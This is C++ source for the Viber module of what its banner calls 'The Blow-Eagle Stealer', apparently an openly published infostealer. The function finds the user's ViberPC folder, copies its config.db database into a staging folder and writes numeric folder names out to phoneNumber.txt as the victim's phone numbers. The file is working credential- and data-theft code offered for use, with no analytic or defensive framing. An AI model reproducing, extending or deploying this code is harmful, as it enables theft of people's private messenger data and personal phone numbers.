/*
|==================================================================================================================|
|████████╗██╗░░██╗███████╗  ██████╗░██╗░░░░░░█████╗░░██╗░░░░░░░██╗░░░░░░███████╗░█████╗░░██████╗░██╗░░░░░███████╗ |
|╚══██╔══╝██║░░██║██╔════╝  ██╔══██╗██║░░░░░██╔══██╗░██║░░██╗░░██║░░░░░░██╔════╝██╔══██╗██╔════╝░██║░░░░░██╔════╝ |
|░░░██║░░░███████║█████╗░░  ██████╦╝██║░░░░░██║░░██║░╚██╗████╗██╔╝█████╗█████╗░░███████║██║░░██╗░██║░░░░░█████╗░░ |
|░░░██║░░░██╔══██║██╔══╝░░  ██╔══██╗██║░░░░░██║░░██║░░████╔═████║░╚════╝██╔══╝░░██╔══██║██║░░╚██╗██║░░░░░██╔══╝░░ |
|░░░██║░░░██║░░██║███████╗  ██████╦╝███████╗╚█████╔╝░░╚██╔╝░╚██╔╝░░░░░░░███████╗██║░░██║╚██████╔╝███████╗███████╗ |
|░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═════╝░╚══════╝░╚════╝░░░░╚═╝░░░╚═╝░░░░░░░░╚══════╝╚═╝░░╚═╝░╚═════╝░╚══════╝╚══════╝ |
|                                                                                                                  |
|                               ░██████╗████████╗███████╗░█████╗░██╗░░░░░███████╗██████╗░                          |
|                               ██╔════╝╚══██╔══╝██╔════╝██╔══██╗██║░░░░░██╔════╝██╔══██╗                          |
|                               ╚█████╗░░░░██║░░░█████╗░░███████║██║░░░░░█████╗░░██████╔╝                          |
|                               ░╚═══██╗░░░██║░░░██╔══╝░░██╔══██║██║░░░░░██╔══╝░░██╔══██╗                          |
|                               ██████╔╝░░░██║░░░███████╗██║░░██║███████╗███████╗██║░░██║                          |
|                               ╚═════╝░░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚══════╝╚══════╝╚═╝░░╚═╝                          |
|==================================================================================================================|

-----------------------------------------------------------------
|by: Nick_Vinesmoke                                             |
|Autor github: https://github.com/Nick-Vinesmoke                |
|Original repo: https://github.com/Nick-Vinesmoke/The-Blow-Eagle|
-----------------------------------------------------------------
*/

#include "../targets.h"
#include "../../config/config.c"
#include  "../../helper/helper.h"
#include <fstream>


bool isNumeric(const std::string& str)
{
	for (char c : str)
	{
		if (!isdigit(c))
		{
			return false;
		}
	}
	return true;
}

void messengers::Viber()
{
	printf("Viber\n");
	std::string user = func::GetUser();
	std::string local = "C:/Users/" + user + "/AppData/Local";

	std::string roaming = "C:/Users/" + user + "/AppData/Roaming";

	if (std::filesystem::exists(roaming+"/ViberPC"))
	{
		std::string defaultPaths[] = {

	"C:/Users/" + user + config::path + "/Messengers",
	"C:/Users/" + user + config::path + "/Messengers/Viber",

		};

		std::string files[]{
			roaming + "/ViberPC/config.db"
		};

		std::string dirs[]{
	roaming + "/ViberPC"
		};

		for (size_t j = 0; j < std::size(defaultPaths); j++)
		{
			int result = _mkdir(defaultPaths[j].c_str());
		}

		for (size_t i = 0; i < std::size(files); i++)
		{
			func::copyFile(files[i], defaultPaths[1]);
		}

		int arrSize = 0;

		std::string* vbDirs = new std::string[arrSize];

		func::GetDirectories(dirs[0], vbDirs, arrSize);

		for (size_t i = 0; i < arrSize; i++)
		{
			if (isNumeric(vbDirs[i]))
			{
				std::ofstream file(defaultPaths[1] + "/phoneNumber.txt", std::ios::app);
				if (file.is_open())
				{
					file << std::string("+") + vbDirs[i];
				}

				file.close();
			}
		}
	}
}